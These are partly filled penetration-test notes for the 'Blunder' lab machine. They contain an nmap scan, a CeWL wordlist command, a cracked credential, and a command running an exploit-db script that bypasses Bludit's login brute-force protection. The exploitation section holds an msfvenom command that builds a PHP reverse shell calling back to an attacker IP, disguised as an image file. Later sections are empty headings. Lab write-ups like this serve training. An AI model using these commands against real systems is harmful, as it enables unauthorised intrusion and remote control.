# Information gathering
`10.10.10.191`

## Port Scan

``` bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-12 19:24 CST
Nmap scan report for 10.10.10.191
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
|_http-generator: Blunder

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.57 seconds
```

## Service Enumerate

### Web Enumerate
#### Directory Enum
find admin directory
### Service 2


## Password Crack
### john

### hydra

### CeWL

```
cewl http://10.10.10.191
```

# Exploit
1. brute force the password and get valid credential: `fergus / RolandDeschain`

2. bypass brute force protection vuln: [https://rastating.github.io/bludit-brute-force-mitigation-bypass/]

```bash
python3 48942.py -l http://10.10.10.191/admin -u user.txt -p password.txt
```

## Initial Foothold

1. generate payload `msfvenom -p php/reverse_php lhost=10.10.14.2 lport=6001 -f raw -b '"' > evil.png`
2. exp link: https://www.exploit-db.com/exploits/48701
3. edit exp:
```
url = 'http://10.10.10.191'  # CHANGE ME
username = 'fergus'  # CHANGE ME
password = 'RolandDeschain'  # CHANGE ME

```

### Exploit method

### Vulnerability Explanation

### Exp code or link

### Proof screen shot



## Lateral Movement

### Exploit method

### Exp code or link

### Proof screen shot


## Privilege Escalation

### Exploit method

### Exp code or link

### Proof screen shot